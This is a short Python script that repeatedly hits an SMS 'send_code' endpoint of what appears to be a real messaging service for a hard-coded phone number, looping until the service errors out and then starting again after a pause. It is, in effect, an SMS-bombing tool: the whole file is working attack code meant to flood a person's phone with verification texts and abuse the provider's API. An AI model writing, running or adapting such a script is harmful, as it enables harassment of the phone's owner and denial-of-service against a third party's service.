import requests
import time
phone_numbers = ["989123456789"]

url = "https://api.pantel.me/a/send_code?phone_number="
def send_code(Apiurl, phone):
  while(True):
      resp = requests.get(url+phone)
      result = resp.json()
      print(result)
      if result["fully_cached"]:
        print("in if")
        while(True):
          resp = requests.get(Apiurl+"+"+phone)
          result = resp.json()
          print(result)
          if result["status"] == "error":
            break
        break
        
        
  
  
while(True):
  
  for phone in phone_numbers:
    send_code(url, phone)
    #time.sleep(10)
  time.sleep(1000) 
print(" done")
